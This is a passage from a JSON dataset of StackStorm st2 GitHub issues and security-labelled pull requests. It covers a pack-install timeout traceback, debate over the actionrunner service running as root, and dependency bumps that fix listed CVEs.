                        "body": "I am having a similar issue I think.  I am using a private repo on an internal github implementation. \r\n \r\n```git clone git@mygitserver/myrepo.git``` works fine when I execute this from the stackstorm server as either root or stanley.  (I added a deploy key to the repo for each as I am not sure which is being used)\r\n\r\n```st2 pack install file://$PWD``` from within the cloned repo also works fine and the pack is installed\r\n\r\nHowever if I try to do this 2-step process in 1 step it fails.  i.e. ```st2 pack install git@mygitserver/myrepo.git```.  \r\n\r\nThe action timesout after 600s with an error ```Action failed to complete in 600 seconds\"``` and ```IndexError: list index out of range```\r\n\r\nI was planning to demo how to install packs using chatops which is why I wanted to do it this way. I suppose I could create my own pack / action to do it in 2 steps though\r\n",
                        "user": "djh2020",
                        "issue_author_association": "NONE",
                        "project_created_at": "2017-06-27T20:03:06Z",
                        "url": "https://github.com/StackStorm/st2/issues/3298#issuecomment-311469093"
                    },
                    {
                        "body": "Here is the traceback\r\n\r\n```\r\n2017-06-27 19:51:35,397  DEBUG - Using cached token from file \"/root/.st2/token-st2admin\"\r\n# -------- begin 139842584544336 request ----------\r\ncurl -X POST -H  'Connection: keep-alive' -H  'Accept-Encoding: gzip, deflate' -H  'Accept: */*' -H  'User-Agent: python-requests/2.14.2' -H  'content-type: application/json' -H  'X-Auth-Token: 7bb4eec372e5499980da968f51db1a52' -H  'Content-Length: 77' --data-binary '{\"force\": false, \"packs\": [\"git://mygitserver/myorg/pack_demo.git\"]}' http://127.0.0.1:9101/v1/packs/install\r\n# -------- begin 139842584544336 response ----------\r\n{\r\n    \"execution_id\": \"5952b747739f8043af361bef\"\r\n}\r\n# -------- end 139842584544336 response ------------\r\n\r\n\r\n\t[  timeout  ] download pack\r\n\r\n# -------- begin 139842584544528 request ----------\r\ncurl -X GET -H  'Connection: keep-alive' -H  'Accept-Encoding: gzip, deflate' -H  'Accept: */*' -H  'User-Agent: python-requests/2.14.2' -H  'X-Auth-Token: 7bb4eec372e5499980da968f51db1a52' http://127.0.0.1:9101/v1/executions/5952b747739f8043af361bef\r\n# -------- begin 139842584544528 response ----------\r\n{\r\n    \"status\": \"timeout\",\r\n    \"start_timestamp\": \"2017-06-27T19:51:35.428307Z\",\r\n    \"log\": [\r\n        {\r\n            \"status\": \"requested\",\r\n            \"timestamp\": \"2017-06-27T19:51:35.436000Z\"\r\n        },\r\n        {\r\n            \"status\": \"scheduled\",\r\n            \"timestamp\": \"2017-06-27T19:51:35.498000Z\"\r\n        },\r\n        {\r\n            \"status\": \"running\",\r\n            \"timestamp\": \"2017-06-27T19:51:35.556000Z\"\r\n        },\r\n        {\r\n            \"status\": \"timeout\",\r\n            \"timestamp\": \"2017-06-27T20:01:35.950000Z\"\r\n        }\r\n    ],\r\n    \"parameters\": {\r\n        \"packs\": [\r\n            \"git://mygitserver/myorg/pack_demo.git\"\r\n        ]\r\n    },\r\n    \"runner\": {\r\n        \"runner_module\": \"action_chain_runner\",\r\n        \"uid\": \"runner_type:action-chain\",\r\n        \"enabled\": true,\r\n        \"name\": \"action-chain\",\r\n        \"runner_parameters\": {\r\n            \"display_published\": {\r\n                \"default\": false,\r\n                \"type\": \"boolean\",\r\n                \"description\": \"Intermediate published variables will be stored and displayed.\"\r\n            },\r\n            \"skip_notify\": {\r\n                \"default\": [],\r\n                \"type\": \"array\",\r\n                \"description\": \"List of tasks to skip notifications for.\"\r\n            }\r\n        },\r\n        \"id\": \"594ab80d739f8032042de1ca\",\r\n        \"description\": \"A runner for launching linear action chains.\"\r\n    },\r\n    \"id\": \"5952b747739f8043af361bef\",\r\n    \"elapsed_seconds\": 600.483209,\r\n    \"web_url\": \"https://myserver.mycompany.com/#/history/5952b747739f8043af361bef/general\",\r\n    \"result\": {\r\n        \"tasks\": [\r\n            {\r\n                \"name\": \"download pack\",\r\n                \"workflow\": null,\r\n                \"created_at\": \"2017-06-27T19:51:35.620432+00:00\",\r\n                \"updated_at\": \"2017-06-27T20:01:35.881461+00:00\",\r\n                \"state\": \"timeout\",\r\n                \"result\": {\r\n                    \"result\": \"None\",\r\n                    \"error\": \"Action failed to complete in 600 seconds\",\r\n                    \"exit_code\": -9,\r\n                    \"stderr\": \"\",\r\n                    \"stdout\": \"\"\r\n                },\r\n                \"id\": \"download pack\",\r\n                \"execution_id\": \"5952b747739f8025c0b8f37c\"\r\n            }\r\n        ]\r\n    },\r\n    \"context\": {\r\n        \"rbac\": {\r\n            \"user\": \"stanley\",\r\n            \"roles\": [\r\n                \"admin\"\r\n            ]\r\n        },\r\n        \"user\": \"stanley\"\r\n    },\r\n    \"action\": {\r\n        \"runner_type\": \"action-chain\",\r\n        \"name\": \"install\",\r\n        \"parameters\": {\r\n            \"register\": {\r\n                \"default\": \"all\",\r\n                \"type\": \"string\",\r\n                \"description\": \"Possible options are all, sensors, actions, rules, aliases, runners, triggers, rule_types, policiy_types, policies, configs.\"\r\n            },\r\n            \"force\": {\r\n                \"default\": false,\r\n                \"required\": false,\r\n                \"type\": \"boolean\",\r\n                \"description\": \"Set to True to force install the pack and skip StackStorm version compatibility check and also delete and ignore lock file if one exists.\"\r\n            },\r\n            \"env\": {\r\n                \"required\": false,\r\n                \"type\": \"object\",\r\n                \"description\": \"Optional environment variables.\"\r\n            },\r\n            \"packs\": {\r\n                \"items\": {\r\n                    \"type\": \"string\"\r\n                },\r\n                \"required\": true,\r\n                \"type\": \"array\",\r\n                \"description\": \"Name of the pack in Exchange or a git repo URL.\"\r\n            }\r\n        },\r\n        \"tags\": [],\r\n        \"enabled\": true,\r\n        \"entry_point\": \"workflows/install.yaml\",\r\n        \"notify\": {},\r\n        \"uid\": \"action:packs:install\",\r\n        \"pack\": \"packs\",\r\n        \"ref\": \"packs.install\",\r\n        \"id\": \"594ab80e739f8032042de202\",\r\n        \"description\": \"Installs or upgrades a pack into local content repository, either by git URL or a short name matching an index entry. Will download pack, load the actions, sensors and rules from the pack. Note that install requires reboot of some st2 services.\"\r\n    },\r\n    \"liveaction\": {\r\n        \"runner_info\": {\r\n            \"hostname\": \"myserver.mycompany.com\",\r\n            \"pid\": 9664\r\n        },\r\n        \"parameters\": {\r\n            \"packs\": [\r\n                \"git://mygitserver/myorg/pack_demo.git\"\r\n            ]\r\n        },\r\n        \"action_is_workflow\": true,\r\n        \"callback\": {},\r\n        \"action\": \"packs.install\",\r\n        \"id\": \"5952b747739f8043af361bee\"\r\n    },\r\n    \"children\": [\r\n        \"5952b747739f8025c0b8f37c\"\r\n    ],\r\n    \"end_timestamp\": \"2017-06-27T20:01:35.911516Z\"\r\n}\r\n# -------- end 139842584544528 response ------------\r\n\r\nERROR: list index out of range\r\n\r\nCLI settings:\r\n----------------\r\nConfig file path: /root/.st2/config\r\nClient settings:\r\n----------------\r\nST2_BASE_URL: http://127.0.0.1\r\nST2_AUTH_URL: http://127.0.0.1:9100\r\nST2_API_URL: http://127.0.0.1:9101/v1\r\nST2_AUTH_TOKEN: 7bb4eec372e5499980da968f51db1a52\r\n\r\nProxy settings:\r\n---------------\r\nHTTP_PROXY: \r\nHTTPS_PROXY: \r\n\r\nTraceback (most recent call last):\r\n  File \"/opt/stackstorm/st2/local/lib/python2.7/site-packages/st2client/shell.py\", line 298, in run\r\n    args.func(args)\r\n  File \"/opt/stackstorm/st2/local/lib/python2.7/site-packages/st2client/commands/resource.py\", line 44, in decorate\r\n    return func(*args, **kwargs)\r\n  File \"/opt/stackstorm/st2/local/lib/python2.7/site-packages/st2client/commands/pack.py\", line 200, in run_and_print\r\n    packs = instance.result['tasks'][1]['result']['result']\r\nIndexError: list index out of range\r\n```",
                        "user": "djh2020",
                        "issue_author_association": "NONE",
                        "project_created_at": "2017-06-27T20:11:43Z",
                        "url": "https://github.com/StackStorm/st2/issues/3298#issuecomment-311471235"
                    },
                    {
                        "body": "I am seeing the same issue",
                        "user": "keatsfonam",
                        "issue_author_association": "NONE",
                        "project_created_at": "2017-08-18T22:11:41Z",
                        "url": "https://github.com/StackStorm/st2/issues/3298#issuecomment-323472178"
                    },
                    {
                        "body": "I wish the git clone would use the system user (st2) instead of root. I don't like using root to `git clone` anything.\r\nI'm on CentOS 7",
                        "user": "cognifloyd",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2017-09-07T23:08:04Z",
                        "url": "https://github.com/StackStorm/st2/issues/3298#issuecomment-327951320"
                    },
                    {
                        "body": "Adding a specific identity file to the global ssh_config for our restricted domain works, too.\r\n\r\nAdd\r\n```\r\nHost github.restricteddomain.com\r\n        IdentityFile /path/to/id_rsa\r\n```\r\nto `/etc/ssh/ssh_config`\r\n\r\n(rhel7)",
                        "user": "mickmcgrath13",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2017-11-01T16:44:02Z",
                        "url": "https://github.com/StackStorm/st2/issues/3298#issuecomment-341164160"
                    },
                    {
                        "body": "The reason `pack install` runs as root, is because all actions run as root, because `actionrunner` runs as root.\r\n\r\nSo, `actionrunner` runs as root because of https://github.com/StackStorm/st2-packages/pull/195 and https://github.com/StackStorm/st2-packages/pull/205\r\n> > I am specifically not happy about adding a user that has passwordless sudo privileges as part of packaging.\r\n>\r\n> I think you are right, agreed. Thus I will revert actionrunner to run as `root` and corresponding changes\r\n> ... unless you have any other suggestions how to use actionrunner as unprivileged user. Since I see no options, actionrunner HAS TO BE ROOT at the moment.\r\n\r\nOf course, then the various install methods (one liner and ansible at least) add `stanley` with passwordless sudo (skippable with some ansible vars). And then, we get all sorts of side effects of running as root instead of another user.\r\n\r\nNow I'm seeing root owned files all over the place as my actions edit or modify files. A file owned by root has many potential actors (any service running as root). But `stanley` is a stackstorm user, so looking at StackStorm's history is a good way to see why something may have been edited versus reviewing other logs first to see if it was some other service. It may not be more secure to run as stanley, but it is slightly more auditable.\r\n\r\nEspecially problematic is when an action edits a file that happens to be on our NFS v3 NAS. See, all users have the same access to the NAS as a system mounted drive *except root* who has special NFS permissions. All other users get mapped to a single NAS user, but root is root. So suddenly, files that are supposed to be world readable/writable are suddenly locked and only root can edit them. It can take a bit to reset those permissions so that they are again accessible correctly over both NFS (and to complicate it even further, through CIFS).\r\n\r\nAnd then, there's all of the sshconfig that I have to add to the root user. Yes, there's passwordless sudo on that special system user, but I would rather not attach all of that config to the root user.\r\n\r\nSo, maybe `actionrunner` can continue running as root, but it should drop into a user (configured in st2.conf) to actually run the actions. That user could default to `stanley`. Or there needs to be a documented/supported way to configure `actionrunner` to run as `stanley`. The PR I found is from 2016, there might be other newer reasons (that I'm unware of) that `actionrunner` needs to run as `root`. I don't know if there is anything else that will break if I, for example, drop in a systemd unit conf file that overrides the user for the actionrunner service.\r\n\r\nIn sum, I have two conflicting suggestions to fix this:\r\n1. Make `actionrunner` run users as a non-root user by default (like stanley), but keep running actionrunner as root.\r\n2. Document/support a method for configuring actionrunner to run as a non-root user instead of the default of root.",
                        "user": "cognifloyd",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2018-09-26T07:59:20Z",
                        "url": "https://github.com/StackStorm/st2/issues/3298#issuecomment-424622410"
                    },
                    {
                        "body": "why does actionrunner needs root permissions? I dived into the links here and all I see is because another user without a password and all the permissions is just as bad. I would argue that a non root user wouldnt have full OS access. Please point me to the specific requirement thanks",
                        "user": "guzzijones",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2022-11-30T23:50:12Z",
                        "url": "https://github.com/StackStorm/st2/issues/3298#issuecomment-1332905616"
                    },
                    {
                        "body": "It looks like the sudo action runner is the holdup. I would argue that we should document a systemd conf fix and note sudo could then be disabled",
                        "user": "guzzijones",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2022-11-30T23:56:38Z",
                        "url": "https://github.com/StackStorm/st2/issues/3298#issuecomment-1332909279"
                    },
                    {
                        "body": "Hello all, is there any update on this? Or do we have a guide of how to setup stackstorm without root permissions?",
                        "user": "docbyte86",
                        "issue_author_association": "NONE",
                        "project_created_at": "2024-04-12T06:26:31Z",
                        "url": "https://github.com/StackStorm/st2/issues/3298#issuecomment-2051071809"
                    }
                ],
                "pull_request": null
            }
        ],
        "SecurityPolicy_reporting_mechanism": "email",
        "num_security_issues_after_policy": 30,
        "num_security_issue_and_pull": 45,
        "security_issues_created_after_policy": [
            {
                "url": "https://github.com/StackStorm/st2/pull/6072",
                "title": "Update importlib-metadata (security)",
                "labels": [
                    "security",
                    "size/S"
                ],
                "user": "arm4b",
                "issue_author_association": "MEMBER",
                "number": 6072,
                "id": 2011029481,
                "state": "closed",
                "project_created_at": "2023-11-26T12:50:29Z",
                "closed_at": "2023-11-27T07:55:58Z",
                "body": "Extract from #6062 by @jk464 changes to update a single `importlib-metadata` dependency in this PR, as the other change related to `requests` in the beforementioned PR fails to build.\r\n\r\nThis will install importlib-metadata==4.10.1 (security fixed) under py3.8 and importlib-metadata==4.8.3 (latest available, vulnerable) under py3.6.\r\n\r\nAddress https://github.com/python/importlib_metadata/issues/361 under py3.8.\r\n\r\nWe should drop py3.6 support ASAP after v3.8.1 patch release.",
                "comments": [],
                "pull_request": {
                    "url": "https://api.github.com/repos/StackStorm/st2/pulls/6072",
                    "merged_at": "2023-11-27T07:55:58Z"
                }
            },
            {
                "url": "https://github.com/StackStorm/st2/pull/6063",
                "title": "Update gitpython (security)",
                "labels": [
                    "enhancement",
                    "security",
                    "size/S"
                ],
                "user": "arm4b",
                "issue_author_association": "MEMBER",
                "number": 6063,
                "id": 1986207619,
                "state": "closed",
                "project_created_at": "2023-11-09T18:45:08Z",
                "closed_at": "2023-11-23T06:07:43Z",
                "body": "Taking one dependency at a time into a separated PRs from https://github.com/StackStorm/st2/pull/6062 to see what could be merged safely ASAP.\r\n\r\nThis updates `gitpython==3.1.37` (security fixed) under py3.8 and `gitpython==3.1.18` (latest installable, but vulnerable) under py3.6\r\n\r\nChecking the build artifacts for shipped gitpython versions:\r\n- U18 (py3.6) - `gitpython==3.1.18`  [(build)](https://app.circleci.com/pipelines/github/StackStorm/st2/4214/workflows/b4932a80-0076-40da-8ab8-393998fbcf6f/jobs/16002?invite=true#step-109-835718_90)\r\n- U20 (py3.8) - `gitpython==3.1.37` ([build](https://app.circleci.com/pipelines/github/StackStorm/st2/4214/workflows/b4932a80-0076-40da-8ab8-393998fbcf6f/jobs/16002/parallel-runs/1?filterBy=ALL&invite=true#step-109-834745_90))\r\n- EL7 (py3.6) - `gitpython==3.1.18` ([build](https://app.circleci.com/pipelines/github/StackStorm/st2/4214/workflows/b4932a80-0076-40da-8ab8-393998fbcf6f/jobs/16002/parallel-runs/2?filterBy=ALL&invite=true#step-109-835226_90))\r\n- EL8 (py3.8) - `gitpython==3.1.37` ([build](https://app.circleci.com/pipelines/github/StackStorm/st2/4214/workflows/b4932a80-0076-40da-8ab8-393998fbcf6f/jobs/16002/parallel-runs/3?filterBy=ALL&invite=true#step-109-851189_90))\r\n\r\nWe should drop the Python 3.6 support after the `3.8.1` patch release and pin githpython explicitly.",
                "comments": [
                    {
                        "body": "@amanda11 Experimented a bit and found that in the `pants` settings we rely on interval between `python3.6` (inclusive) until `python3.10`:\r\nhttps://github.com/StackStorm/st2/blob/32a243a2ed54c5233e10f08b69f0cb21e2f10cb7/pants.toml#L105-L112\r\n\r\nAccording to that, `gitpython==3.1.18` for py3.6 is the correct version for the pants lock as it satisfies all the python version requirements. I tried and it wasn't possible to install dynamically specific package version depending on the `python_version` marker.\r\n\r\nChecking further, if we remove py3.6 from the pants settings, then it would allow using a higher version of gitpython in the lockfile. Not sure if we want to drop py3.6 from pants now or in the v3.9.0 per #6064\r\n",
                        "user": "arm4b",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2023-11-10T20:29:51Z",
                        "url": "https://github.com/StackStorm/st2/pull/6063#issuecomment-1806392481"
                    },
                    {
                        "body": "_Update:_ Yeah, removing py3.6 from pants will try to regenerate all the requirements/lockfile - it probably fits a dedicated PR in the larger scope of `v3.9.0`.\r\n",
                        "user": "arm4b",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2023-11-10T21:20:53Z",
                        "url": "https://github.com/StackStorm/st2/pull/6063#issuecomment-1806449604"
                    }
                ],
                "pull_request": {
                    "url": "https://api.github.com/repos/StackStorm/st2/pulls/6063",
                    "merged_at": "2023-11-23T06:07:43Z"
                }
            },
            {
                "url": "https://github.com/StackStorm/st2/pull/6062",
                "title": "Update requests to fix CVEs (security)",
                "labels": [
                    "security",
                    "size/S"
                ],
                "user": "jk464",
                "issue_author_association": "CONTRIBUTOR",
                "number": 6062,
                "id": 1979966642,
                "state": "closed",
                "project_created_at": "2023-11-06T20:02:31Z",
                "closed_at": "2024-04-26T00:05:47Z",
                "body": "Fixes up a host of CVEs in the `st2` package:\r\n\r\nNote: The `XRAY` references are vulnerabilities listed by [JFrog Xray](https://jfrog.com/help/r/get-started-with-the-jfrog-platform/jfrog-xray), that don't seem to have a corresponding CVE. JFrog doesn't seem to publish these references publicly - but I've linked to the issue disclosing the vulnerability thats referenced by the `XRAY` entry.\r\n\r\n# Bump cryptography to 41.0.4, pyopenssl to 23.2.0\r\n\r\nFixes:\r\n* [CVE-2023-4807](https://nvd.nist.gov/vuln/detail/CVE-2023-4807)\r\n* [CVE-2023-2650](https://nvd.nist.gov/vuln/detail/CVE-2023-2650)\r\n* [CVE-2023-3446](https://nvd.nist.gov/vuln/detail/CVE-2023-3446)\r\n\r\npyopenssl 23.2.0 required for cryptography to 41.0.x support\r\n\r\n# Bump virtualenv to 20.16.7\r\n\r\nFixes:\r\n* [CVE-2019-20916](https://nvd.nist.gov/vuln/detail/CVE-2019-20916)\r\n\r\n# Bump importlib-metadata to 4.10.1\r\n\r\nFixes:\r\n* [XRAY-195083](https://github.com/python/importlib_metadata/issues/361)\r\n\r\n# Bump requests to 2.31.0\r\n\r\nFixes:\r\n* [CVE-2023-32681](https://nvd.nist.gov/vuln/detail/CVE-2023-32681)\r\n\r\n# Bump gitpython to 3.1.37\r\n\r\nFixes:\r\n* [CVE-2023-40267](https://nvd.nist.gov/vuln/detail/CVE-2023-40267)\r\n* [CVE-2023-41040](https://nvd.nist.gov/vuln/detail/CVE-2023-41040)\r\n* [CVE-2023-40590](https://nvd.nist.gov/vuln/detail/CVE-2023-40590)\r\n* [CVE-2022-24439](https://nvd.nist.gov/vuln/detail/CVE-2022-24439)\r\n* [XRAY-198950](https://huntr.com/bounties/8549d81f-dc45-4af7-9f2a-2d70752d8524/)\r\n\r\n# Supercedes/Implements\r\n\r\n* https://github.com/StackStorm/st2/pull/6059\r\n* https://github.com/StackStorm/st2/pull/6058\r\n* https://github.com/StackStorm/st2/pull/6057\r\n* https://github.com/StackStorm/st2/pull/6056\r\n* https://github.com/StackStorm/st2/pull/6054\r\n* https://github.com/StackStorm/st2/pull/6053",
                "comments": [
                    {
                        "body": "@armab As you can probably see from my commits I've hit a bit of a depedency hell trying to get requirement ranges that:\r\n\r\n* Allow the last supported py3.6\r\n* A version with relevant CVEs fixed in py3.8\r\n\r\nI can see in https://github.com/StackStorm/st2/pull/6063 you've hopefully got `gitpython` handled.\r\n\r\nI'll probably do the same as you here and split this into bit size PRs to make it more manageable.\r\n\r\nI did look at fixing `fixate-requriements.py` to support reading `python_version` which I actually got working (See https://github.com/StackStorm/st2/pull/6062/commits/61b47db603c7d21a06142228f031713ba77d7a35) (which is probably worth having, even after dropping py3.6 in `3.9.0`) - issue I hit was the `stackstorm/packagingbuild:bionic` was missing the package that I wanted to using (`packaging`) so that image would also need bumped.\r\n\r\nIf you think its worth our time adding that support, I'll take a look at updating the image as well :)",
                        "user": "jk464",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2023-11-11T12:56:03Z",
                        "url": "https://github.com/StackStorm/st2/pull/6062#issuecomment-1806810177"
                    },
                    {
                        "body": "@jk464 Your enhancement to fixate-requriements.py looks really clean. But overall I felt like env markers are buggy in many places, including older pip version we're locked to (because of py3.6) and even pants that doesn't support them in requirements-pants.txt so touching them might be like opening a can of worms.\r\nI hope the builds would be migrated to pants from all the old machinery and so `fixate-requriements.py` may be obsolete by then.\r\n\r\n@cognifloyd do you think it's doable to migrate to the pants builds in the upcoming v3.9.0? ",
                        "user": "arm4b",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2023-11-11T13:46:31Z",
                        "url": "https://github.com/StackStorm/st2/pull/6062#issuecomment-1806821668"
                    },
                    {
                        "body": "So at least `importlib-metadata` changes are extracted into a dedicated PR which could be merged ASAP: https://github.com/StackStorm/st2/pull/6072\r\n",
                        "user": "arm4b",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2023-11-26T13:15:42Z",
                        "url": "https://github.com/StackStorm/st2/pull/6062#issuecomment-1826782003"
                    },
                    {
                        "body": "@armab if the build is failing for `requests` and the update to `importlib-metadata` was merged in #6072 is there anything left to do in this PR?\r\n\r\nThe only CVE I see listed against `requests` is [CVE-2023-32681](https://nvd.nist.gov/vuln/detail/CVE-2023-32681) - which is only `medium` Sev - so I think we could just drop fixing that to `3.9.0` at which point we can(?) drop python `3.6` and bump this w/o issue. (And I assume for `3.9.0` we'd probably rather being bumping dependencies to the highest support by `3.8`.)\r\n\r\nLet me know what you think and I can close this PR if there's nothing further to do",
                        "user": "jk464",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2023-11-27T11:59:46Z",
                        "url": "https://github.com/StackStorm/st2/pull/6062#issuecomment-1827696254"
                    },
                    {
                        "body": "@jk464 Yeah, let's reassign this PR to the `v3.9.0` roadmap\r\nIt'll be a reminder that `requests` will need an update after dropping the py3.6.\r\n",
                        "user": "arm4b",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2023-11-27T18:51:12Z",
                        "url": "https://github.com/StackStorm/st2/pull/6062#issuecomment-1828427234"
                    }
                ],
                "pull_request": {
                    "url": "https://api.github.com/repos/StackStorm/st2/pulls/6062",
                    "merged_at": null
                }
            },
            {
                "url": "https://github.com/StackStorm/st2/pull/6061",
                "title": "Bump eventlet to fix setting SSLContext minimum_version property that results in RecursionErrors",
                "labels": [
                    "enhancement",
                    "security",
                    "size/M"
                ],
                "user": "jk464",
                "issue_author_association": "CONTRIBUTOR",
                "number": 6061,
                "id": 1979789546,
                "state": "closed",
                "project_created_at": "2023-11-06T18:21:41Z",
                "closed_at": "2023-11-06T22:29:55Z",
                "body": "While writing a sensor for st2 - we hit this error:\r\n\r\n```\r\nstackstorm-docker-compose-st2sensorcontainer-1  | 2023-10-24 14:23:28,648 WARNING [-] Sensor \"PollPagerDuty\" run method raised an exception: maximum recursion depth exceeded while calling a Python object.\r\nstackstorm-docker-compose-st2sensorcontainer-1  | Traceback (most recent call last):\r\nstackstorm-docker-compose-st2sensorcontainer-1  |   File \"/opt/stackstorm/st2/lib/python3.8/site-packages/st2reactor/container/sensor_wrapper.py\", line 285, in run\r\nstackstorm-docker-compose-st2sensorcontainer-1  |     self._sensor_instance.run()\r\nstackstorm-docker-compose-st2sensorcontainer-1  |   File \"/opt/stackstorm/st2/lib/python3.8/site-packages/st2reactor/sensor/base.py\", line 121, in run\r\nstackstorm-docker-compose-st2sensorcontainer-1  |     self.poll()\r\nstackstorm-docker-compose-st2sensorcontainer-1  |   File \"/opt/stackstorm/packs/****_pagerduty/sensors/poll_pagerduty.py\", line 27, in poll\r\nstackstorm-docker-compose-st2sensorcontainer-1  |     self._detect_triggered_incidents()\r\nstackstorm-docker-compose-st2sensorcontainer-1  |   File \"/opt/stackstorm/packs/****_pagerduty/sensors/poll_pagerduty.py\", line 42, in _detect_triggered_incidents\r\nstackstorm-docker-compose-st2sensorcontainer-1  |     incidents = self.pagerduty.list_all(\r\nstackstorm-docker-compose-st2sensorcontainer-1  |   File \"/opt/stackstorm/virtualenvs/****_pagerduty/lib/python3.8/site-packages/pdpyras.py\", line 1911, in list_all\r\nstackstorm-docker-compose-st2sensorcontainer-1  |     return list(self.iter_all(url, **kw))\r\nstackstorm-docker-compose-st2sensorcontainer-1  |   File \"/opt/stackstorm/virtualenvs/****_pagerduty/lib/python3.8/site-packages/pdpyras.py\", line 1788, in iter_all\r\nstackstorm-docker-compose-st2sensorcontainer-1  |     self.get(url, params=data.copy()),\r\nstackstorm-docker-compose-st2sensorcontainer-1  |   File \"/opt/stackstorm/st2/lib/python3.8/site-packages/requests/sessions.py\", line 602, in get\r\nstackstorm-docker-compose-st2sensorcontainer-1  |     return self.request(\"GET\", url, **kwargs)\r\nstackstorm-docker-compose-st2sensorcontainer-1  |   File \"/opt/stackstorm/virtualenvs/****_pagerduty/lib/python3.8/site-packages/pdpyras.py\", line 1121, in request\r\nstackstorm-docker-compose-st2sensorcontainer-1  |     response = self.parent.request(method, full_url, **req_kw)\r\nstackstorm-docker-compose-st2sensorcontainer-1  |   File \"/opt/stackstorm/st2/lib/python3.8/site-packages/requests/sessions.py\", line 589, in request\r\nstackstorm-docker-compose-st2sensorcontainer-1  |     resp = self.send(prep, **send_kwargs)\r\nstackstorm-docker-compose-st2sensorcontainer-1  |   File \"/opt/stackstorm/st2/lib/python3.8/site-packages/requests/sessions.py\", line 703, in send\r\nstackstorm-docker-compose-st2sensorcontainer-1  |     r = adapter.send(request, **kwargs)\r\nstackstorm-docker-compose-st2sensorcontainer-1  |   File \"/opt/stackstorm/st2/lib/python3.8/site-packages/requests/adapters.py\", line 486, in send\r\nstackstorm-docker-compose-st2sensorcontainer-1  |     resp = conn.urlopen(\r\nstackstorm-docker-compose-st2sensorcontainer-1  |   File \"/opt/stackstorm/st2/lib/python3.8/site-packages/urllib3/connectionpool.py\", line 790, in urlopen\r\nstackstorm-docker-compose-st2sensorcontainer-1  |     response = self._make_request(\r\nstackstorm-docker-compose-st2sensorcontainer-1  |   File \"/opt/stackstorm/st2/lib/python3.8/site-packages/urllib3/connectionpool.py\", line 467, in _make_request\r\nstackstorm-docker-compose-st2sensorcontainer-1  |     self._validate_conn(conn)\r\nstackstorm-docker-compose-st2sensorcontainer-1  |   File \"/opt/stackstorm/st2/lib/python3.8/site-packages/urllib3/connectionpool.py\", line 1092, in _validate_conn\r\nstackstorm-docker-compose-st2sensorcontainer-1  |     conn.connect()\r\nstackstorm-docker-compose-st2sensorcontainer-1  |   File \"/opt/stackstorm/st2/lib/python3.8/site-packages/urllib3/connection.py\", line 642, in connect\r\nstackstorm-docker-compose-st2sensorcontainer-1  |     sock_and_verified = _ssl_wrap_socket_and_match_hostname(\r\nstackstorm-docker-compose-st2sensorcontainer-1  |   File \"/opt/stackstorm/st2/lib/python3.8/site-packages/urllib3/connection.py\", line 735, in _ssl_wrap_socket_and_match_hostname\r\nstackstorm-docker-compose-st2sensorcontainer-1  |     context = create_urllib3_context(\r\nstackstorm-docker-compose-st2sensorcontainer-1  |   File \"/opt/stackstorm/st2/lib/python3.8/site-packages/urllib3/util/ssl_.py\", line 292, in create_urllib3_context\r\nstackstorm-docker-compose-st2sensorcontainer-1  |     context.minimum_version = TLSVersion.TLSv1_2\r\nstackstorm-docker-compose-st2sensorcontainer-1  |   File \"/usr/lib/python3.8/ssl.py\", line 586, in minimum_version\r\nstackstorm-docker-compose-st2sensorcontainer-1  |     super(SSLContext, SSLContext).minimum_version.__set__(self, value)\r\nstackstorm-docker-compose-st2sensorcontainer-1  |   File \"/usr/lib/python3.8/ssl.py\", line 586, in minimum_version\r\nstackstorm-docker-compose-st2sensorcontainer-1  |     super(SSLContext, SSLContext).minimum_version.__set__(self, value)\r\nstackstorm-docker-compose-st2sensorcontainer-1  |   File \"/usr/lib/python3.8/ssl.py\", line 586, in minimum_version\r\nstackstorm-docker-compose-st2sensorcontainer-1  |     super(SSLContext, SSLContext).minimum_version.__set__(self, value)\r\nstackstorm-docker-compose-st2sensorcontainer-1  |   [Previous line repeated 487 more times]\r\nstackstorm-docker-compose-st2sensorcontainer-1  |   File \"/usr/lib/python3.8/ssl.py\", line 584, in minimum_version\r\nstackstorm-docker-compose-st2sensorcontainer-1  |     if value == TLSVersion.SSLv3:\r\nstackstorm-docker-compose-st2sensorcontainer-1  | RecursionError: maximum recursion depth exceeded while calling a Python object\r\n```\r\n\r\nWhich after some digging seems to be this issue here for eventlet - https://github.com/eventlet/eventlet/issues/726\r\n\r\nBumping `evenlet` to `0.33.3` fixes this (and requires bumping `gunicorn` to `21.2.0` to support the new version of `eventlet`)\r\n\r\nThis supersedes https://github.com/StackStorm/st2/pull/5257.\r\n\r\nIt also has the added benefit of resolving - [CVE-2021-21419](https://nvd.nist.gov/vuln/detail/cve-2021-21419) (see [Improper Handling of Highly Compressed Data (Data Amplification) and Memory Allocation with Excessive Size Value in eventlet ](https://github.com/eventlet/eventlet/security/advisories/GHSA-9p9m-jm8w-94p2))",
                "comments": [],
                "pull_request": {
                    "url": "https://api.github.com/repos/StackStorm/st2/pulls/6061",
                    "merged_at": "2023-11-06T22:29:55Z"
                }
            },
            {
                "url": "https://github.com/StackStorm/st2/pull/6055",
                "title": "Update cryptography and pyOpenSSL (security)",
                "labels": [
                    "enhancement",
                    "security",
                    "external dependency",
                    "size/M"
                ],
                "user": "arm4b",
                "issue_author_association": "MEMBER",
                "number": 6055,
                "id": 1975025476,
                "state": "closed",
                "project_created_at": "2023-11-02T20:58:17Z",
                "closed_at": "2023-11-03T20:32:52Z",
                "body": "Update cryptography as well as compatible with it version of pyOpenSSL and paramiko.\r\n* https://cryptography.io/en/latest/changelog/#v39-0-1\r\n* https://www.pyopenssl.org/en/23.1.0/changelog.html\r\n* https://www.paramiko.org/changelog.html#2.11.0\r\n",
                "comments": [
                    {
                        "body": "Yay, RFR!\r\nThat was quite a rabbit hole 🐰 \r\n",
                        "user": "arm4b",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2023-11-03T14:50:37Z",
                        "url": "https://github.com/StackStorm/st2/pull/6055#issuecomment-1792584211"
                    }
                ],
                "pull_request": {
